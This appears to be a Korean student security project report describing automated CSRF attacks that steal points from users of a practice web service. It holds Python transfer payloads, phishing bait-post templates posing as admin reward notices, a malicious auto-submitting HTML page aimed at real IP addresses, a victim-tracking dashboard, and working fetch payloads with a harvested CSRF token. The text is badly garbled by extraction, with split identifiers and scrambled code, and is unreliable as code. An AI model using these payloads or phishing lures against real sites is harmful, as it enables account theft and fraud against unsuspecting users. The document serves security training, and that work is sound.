@@ -1,0 +1,574 @@
+1. 목표 설정
+1) 포인트 전송 방식 분석
+포인트 전송 방식과 관련한 form을 자동으로 분석하여 자동 및 수동 CSRF 포인트 탈취
+방식에 적용하도록 한다.
+2) CSRF 자동 포인트 탈취
+전송 방식과 관련하여 작성된 포인트 탈취 페이로드를 실행시켜 생성해둔 hacker 계정으
+로 자동 포인트 탈취가 진행되도록 한다.
+3) 미끼 게시글을 통한 수동 포인트 탈취
+소셜 엔지니어링 기법을 토대로 피싱 사이트 접속을 유도하여 클릭할 경우 포인트가 탈
+취되도록 한다.
+4) 대시보드 및 공격 결과 시각화
+탈취한 총 포인트 및 탈취 현황, 피해자 정보 등 현황을 실시간 로깅하며 모니터링하도
+록 하며, CSV 파일로 출력할 수 있도록 하고, CSRF 공격 시 터미널을 통한 결과값 확인뿐
+만 아니라 CVE 번호 및 취약점 분석 리포트를 json, html 파일로 정리한 자료를 출력할 수
+있도록 시각화 한다.
+2. 자동화 공격 도구 분석
+- 언어: Python3, html, json
+- 주요 라이브러리: requests, BeautifulSoup, Flask
+1) CSRF 자동화 공격: 1124
+CSRF
+_
+_
+Auto.py
+알려진 user 계정 (bob)으로 자동 로그인하여 hacker 계정으로 자동으로 포인트를 탈취하
+게 설계하였다.
+실제 테스트로 포인트를 전송하며 요청-응답과 관련하여 작동하는 방식을 파악하고, 해당
+방식을 차용하여 방식들을 작성하였다. 파악된 주요 페이로드는 다음과 같다.
+- 60 -
+[ 포인트 전송 페이로드 확인 ]
+[ python 주요 기능 설명 : 자동화 포인트 전송 실행 방식 ]
+transfer
+{
+_
+methods = [
+'name': ' GET Parameter Attack'
+,
+'type': 'GET'
+,
+'url':
+f"{self.base
+_
+url}/profile.php?receiver
+_
+id={self.hacker
+_
+id}&points={self.target_points}&send
+_
+gift=1&message=auto_transfer"
+},
+# GET 요청으로
+{
+'name': ' POST Form Attack'
+,
+'type': 'POST'
+,
+'url': f"{self.base
+_
+url}/profile.php"
+,
+'data': {
+'receiver
+id': self.hacker
+_
+_id,
+'points': self.target_points,
+'send_gift': '1'
+,
+'gift_type': 'coffee'
+,
+'message': '제가 가져갑니다~
+'
+}
+},
+- 61 -
+{
+'name': ' Alternative POST Method'
+'type': 'POST'
+,
+'url': f"{self.base
+_
+url}/profile.php"
+,
+'data': {
+'to
+user
+id': self.hacker
+_
+_
+_id,
+'amount': self.target_points,
+'gift_type': 'flower'
+,
+'send_gift': '1'
+,
+'message': 'Auto transfer'
+,
+}
+},
+{
+'name': ' Premium Gift Method'
+,
+'type': 'POST'
+,
+'url': f"{self.base
+'data': {
+'receiver
+_
+url}/profile.php"
+,
+id': self.hacker
+_
+_id,
+'points': self.target_points,
+'gift_type': 'diamond'
+,
+'send_gift': 1,
+'message': '제 돈입니다 대머리님'
+}
+}
+]
+successful_transfers = 0
+- 62 -
+[ 자동 탈취 성공 후 리포트 및 업로드 자료 ]
+- 63 -
+- 64 -
+2) CSRF 미끼 게시글 업로드: 1124
+CSRF
+_
+_
+Post.py
+접속 시 ”선착순 포인트 제공“의 미끼글로 유도하며 클릭하면 index.html이 실행되면 포인
+트가 자동으로 탈취되도록 설계하였다. 의심의 최소화를 위하여 원래의 user였던 bob의 계
+정으로 자동 로그인하여 게시글을 작성하여 더 많은 클릭을 유도하였다.
+Auto Ver.을 참고하여 html을 설계하였다.
+[ python 주요 기능 설명 : 게시글 작성 폼 분석 ]
+def analyze
+_post_form(self):
+"""게시글 작성 폼 분석"""
+print("\n[ANALYZE] 게시글 작성 폼 분석 중...")
+try:
+response = self.session.get(f"{self.base
+_
+url}/new
+_post.php"
+, timeout=20)
+if response.status
+code == 200:
+_
+soup = BeautifulSoup(response.text,
+forms = soup.find_
+all('form')
+'html.parser')
+for form in forms:
+form
+_
+data = {}
+inputs = form.find
+_
+all(['input', 'textarea'
+,
+'select'])
+for inp in inputs:
+name = inp.get('name'
+, '')
+input_type = inp.get('type'
+, 'text')
+value = inp.get('value'
+, '')
+if name:
+if input_type ==
+'hidden':
+form
+_
+data[name] = value
+elif name.lower() in ['content',
+'message'
+, 'text',
+'post',
+'body']:
+form
+_
+data[name] =
+'PLACEHOLDER
+CONTENT'
+_
+elif input_type ==
+'submit' and value:
+form
+_
+data[name] = value
+if form
+data:
+_
+print(f" 폼 데이터 추출 성공: {list(form
+_
+data.keys())}")
+return form
+data
+_
+- 65 -
+# 기본 폼 데이터
+return {'content': 'PLACEHOLDER
+_
+CONTENT'}
+except Exception as e:
+print(f" 폼 분석 오류: {e}")
+return {'content': 'PLACEHOLDER
+_
+CONTENT'}
+[ python 주요 기능 설명 : 악성 게시글 분석 ]
+def create
+malicious
+_
+_posts(self, form
+_
+data):
+"""악성 게시글 작성"""
+print("\n[PHASE 2] Creating Malicious Posts")
+print("=" * 40)
+# 소셜 엔지니어링 게시글 템플릿
+malicious_templates = [
+f''' 긴급! 무료 포인트 대방출 이벤트!
+오늘만 특별 혜택! 선착순 100명!
+무료 포인트 받는 방법:
+<a href="{self.malicious
+_
+link}" target="_blank">
+여기 클릭하면 즉시 100P 지급!
+</a>
+로그인만 하면 자동으로 포인트가 들어와요!
+한정 시간 이벤트니까 서둘러 받으세요!
+보너스 다이아까지 추가 증정!
+⚠ 로그인이 필요한 경우 다시 로그인 후 링크 재클릭!''',
+f''' 시스템 점검 보상 지급 안내
+안녕하세요! 관리자입니다.
+긴급 공지: 서버 점검으로 인한 보상 지급
+점검 시간: 오늘 오후 2시~4시
+보상 내용: 포인트 200P + 다이아 50개
+보상 받기:
+<a href="{self.malicious
+_
+link}">
+- 66 -
+보상 지급 페이지 (클릭)
+</a>
+자동으로 계정에 지급되니 안심하세요!
+별도 신청 없이 링크 클릭만 하면 완료!''',
+f''' 축하합니다! 럭키 유저 선정!
+당신이 오늘의 럭키 유저로 선정되었습니다!
+럭키 유저 혜택:
+• 포인트 500P 즉시 지급
+• 프리미엄 아이템 무료 증정
+• VIP 등급 1개월 무료
+혜택 받기:
+<a href="{self.malicious
+_
+link}" style="color: red; font-weight: bold;">
+럭키 유저 혜택 받기 (클릭!)
+</a>
+24시간 내에 클릭해야 유효합니다!
+이런 기회는 다시 오지 않아요!'''
+]
+successful
+_posts = 0
+[ 게시글 업로드 성공 후 리포트 및 업로드 자료 ]
+- 67 -
+- 68 -
+- 69 -
+- 70 -
+3) 미끼 게시글: index.html
+깃허브에서 page로 내보낸 html 미끼 게시글에 들어가면 자동으로 포인트를 탈취되게 만드
+는 구조로 생성하였다.
+[ html 주요 탈취 로직 ]
+// Python 스크립트 방식을 참고한 실제 공격
+function executeRealAttack() {
+console.log(' Python 방식 CSRF 공격 시작...');
+statusEl.textContent =
+' 실제 포인트를 전송하고 있습니다...';
+progressBar.style.width =
+'100%';
+// Python 스크립트와 동일한 공격 방법들
+const attacks = [
+{
+method:
+'POST'
+,
+url:
+'http://15.164.94.241/profile.php'
+data: {
+receiver
+id:
+_
+points:
+'30'
+,
+send_gift: '1'
+,
+gift_type:
+'13'
+,
+'coffee'
+,
+,
+- 71 -
+message:
+'어 개털렸죠?'
+},
+points: 30
+},
+{
+method:
+'POST'
+,
+url:
+'http://15.164.94.241/profile.php'
+,
+data: {
+receiver
+id:
+_
+points:
+'25',
+gift_type:
+'13'
+,
+'cake'
+,
+send_gift: '1'
+,
+message:
+'내가 가져간다 이 대머리야'
+},
+points: 25
+},
+];
+let successCount = 0;
+attacks.forEach((attack, i) => {
+setTimeout(() => {
+try {
+if (attack.method === 'GET') {
+// GET 방식: img 태그 사용
+const img = new Image();
+img.onload = () => console.log(` GET 공격 ${i+1} 성공:
+${attack.points}P`);
+img.onerror = () => console.log(`⚠ GET 공격 ${i+1} 전
+송됨: ${attack.points}P`);
+img.src = attack.url;
+successCount++;
+} else {
+// POST 방식: 동적 폼 생성
+const form = document.createElement('form');
+form.method =
+'POST';
+form.action = attack.url;
+form.style.display =
+'none';
+- 72 -
+form.target = '_blank';
+// 폼 데이터 추가
+Object.keys(attack.data).forEach(key => {
+const input = document.createElement('input');
+input.type =
+'hidden';
+input.name = key;
+input.value = attack.data[key];
+form.appendChild(input);
+});
+document.body.appendChild(form);
+form.submit();
+document.body.removeChild(form);
+console.log(` POST 공격 ${i+1} 전송: ${attack.points}P`);
+successCount++;
+}
+} catch (error) {
+console.error(` 공격 ${i+1} 실패:`, error);
+}
+}, i * 2000); // 2초 간격으로 실행
+});
+3. 시각화 대시보드: 1124
+CSRF
+_
+_
+Dashboard.py 및 dashboard.html
+타겟 서버의 모니터링 설정 및 실시간 데이터 저장을 통해 즉각적으로 hacker 계정의 포인
+트 정보를 연동하여 대시보드를 시각화하도록 한다. 실시간 보유 포인트, 누적 탈취 포인트
+및 공격 현황, 피해자 정보, 최대 탈취 금액, 평균 탈취 포인트 등의 정보를 담을 수 있도록
+상단에 요약 정리를 해두었고, 제어판의 로그 내보내기 (csv), 삭제, 자동 갱신 중단 기능을
+두어 부가적인 기능을 구현하였다. /profile.php에 적힌 타임 스탬프, 선물 종류, 메시지, 포
+인트를 가져와 반영한 피해자 로그도 구현하였다.
+[ python 주요 코드 ]
+# 실시간 데이터 추출
+def extract_gift_records(soup):
+"""HTML에서 선물 기록 추출"""
+gift_divs = soup.find_
+all('div'
+, style=re.compile(r'padding.
+*15px'))
+- 73 -
+for div in gift_divs:
+sender
+points
+_
+match = re.search(r'<strong>([^<]+)</strong>', div
+_
+html)
+_
+match = re.search(r'보냈습니다\s*\((\d+)[pP]\)', div_text)
+gift_record = {
+'sender': sender,
+'points': points,
+'timestamp': timestamp
+}
+# API 엔드 포인트
+@app.route('/api/hacker/stats')
+def get_hacker
+_
+stats():
+total
+stolen
+_
+_points = sum(v['points
+_
+stolen'] for v in dashboard
+_
+data['victims'])
+return jsonify({
+'current_points': dashboard
+_
+data['hacker
+_
+current_points'],
+'total
+stolen': total
+stolen
+_
+_
+_points,
+'total
+_
+victims': len(dashboard
+_
+data['victims'])
+})
+@app.route('/api/hacker/victims')
+def get_hacker
+_
+victims():
+victims = sorted(dashboard
+_
+data['victims'], key=lambda x: x['detected
+_
+at'],
+reverse=True)
+return jsonify(victim
+_
+list)
+[ html 실시간 데이터 로드 함수 ]
+function loadHackerStats() {
+fetch('/api/hacker/stats')
+.then(response => response.json())
+.then(data => {
+document.getElementById('hackerCurrentPoints').textContent =
+data.current_points || 0;
+document.getElementById('totalStolen').textContent = data.total
+_
+stolen || 0;
+document.getElementById('totalVictims').textContent = data.total
+_
+victims ||
+0;
+});
+}
+function loadVictimLogs() {
+fetch('/api/hacker/victims')
+- 74 -
+.then(response => response.json())
+.then(data => {
+// 피해자 로그를 동적으로 HTML에 렌더링
+logsDiv.innerHTML = data.map(victim => `
+<div class="victim-log ${victim.is
+_
+new ? 'new-victim'
+: ''}">
+<div class="victim-name">${victim.username}</div>
+<div class="stolen-points">+${victim.points}P</div>
+</div>
+`).join('');
+});
+}
+[ 대시보드 시각화 자료 ]
+- 75 -
+- 76 -
+3. 자동 포인트 탈취 성공 사례 및 시사점
+GET 방식으로는 실패했었으나, POST 요청 파라미터 검증의 미흡으로 실행시켰을 때 자동
+으로 포인트 탈취가 용이했던 것으로 예측되고, 재인증 세션 보안의 부족과 동일한 사용자
+가 동일한 타 사용자에게 단시간 내 다중 전송 시도를 하는 비정상적 거래 패턴 탐지가 불
+가했기에 가능했던 것 같다. API 보안 부족으로 동일한 엔드포인트로 다양한 방법의 공격이
+가능했던 것으로 보인다.
+금융 거래와 관련하여 재인증 방식이나 자동화 대응, 다중 방어가 정밀하게 이루어지지 않
+으면 자동화를 통한 상당한 금전적 침해가 단시간 내에 광범위하게 이루어질 수 있음을 인
+지하여 방어 매커니즘을 정교하게 설계할 필요성을 느꼈다.
+4. 수동 포인트 탈취 실패 사례 및 시사점
+1) 패인 분석
+링크 클릭이 가능한 게시글 업로드는 가능하였으나, Python으로의 자동화 도구 실행과
+HTML의 차이점으로 인해 작동이 곤란한 것으로 예측된다. 차이점은 다음과 같다.
+[ Python vs HTML 차이 분석표 ]
+구분 Python 방식 HTML 방식
+세션 관리 requests.Session() 직접 제어 브라우저 쿠키 정책 제한
+CORS 제한 없음 브라우저에서 차단
+쿠키 전송 강제로 포함 SameSite 정책 적용
+실행 환경 서버/로컬 브라우저 샌드 박스
+브라우저의 Same-Site Cookie 정책으로 인해 다른 도메인으로의 요청 시 외부 사이트에서
+오는 POST 요청에는 쿠키가 포함되지 않는 문제가 발생하여 세션 쿠키가 전송되지 않는 문
+제로 302 Redirect로 응답 코드를 반환하여 인증되지 않은 요청을 로그인 페이지로 계속 리
+다이렉트하는 문제가 발생한 것으로 보인다. CORS preflight 검사 실패로 일부 방식은 403
+Forbidden 응답 코드를 반환하며 접근이 불가하게 되었다.
+2) 개선점 및 향후 계획
+console로 직접 실행시켜 성공했던 방식과 찾았던 정보들을 토대로 수정하여 적용될 수 있
+도록 방법을 모색하여 수동 방식까지 수행하여 광범위한 공격이 수행될 수 있도록 하고자 한
+다. 성공했던 방식은 다음과 같다.
+fetch('http://3.36.66.216/profile.php?gift_to=13'
+, {
+method:
+'POST'
+,
+headers: {
+'Content-Type': 'application/x-www-form-urlencoded'
+,
+},
+body: 'send_gift=1&receiver
+_
+id=13&gift_type=coffee&points=10&message=가져갑
+니다.
+'
+,
+credentials:
+'include'
+}).then(r => console.log('큰공격응답:', r.status));
+- 77 -
+/ 직접 fetch 시도
+fetch('http://3.36.66.216/profile.php?gift_to=13'
+, {
+method:
+'POST'
+,
+headers: {
+'Content-Type': 'application/x-www-form-urlencoded'
+,
+},
+빡빡아'
+,
+credentials:
+'include'
+}).then(r => console.log('응답:', r.status));
+body: 'send_gift=1&receiver
+_
+id=13&gift_type=coffee&points=5&message=내꺼다이
+#CSRF 토큰
+// 페이지 소스에서 숨겨진 토큰 찾기
+document.querySelectorAll('input[type="hidden"]').forEach(input => {
+console.log(input.name, '='
+, input.value);
+});
+// 모든 폼 필드 확인
+document.querySelectorAll('form').forEach(form => {
+console.log('폼 액션:', form.action);
+console.log('폼 메소드:', form.method);
+});
+VM425:3 update
+_profile = 1
+VM425:3 csrf_token =
+efccf9ef2fe77e351dcd66d0c7470a0fa274c25d378b9dd3129cf3ecf8547347
+VM425:8 폼 액션: http://3.36.66.216/profile.php
+VM425:9 폼 메소드: post
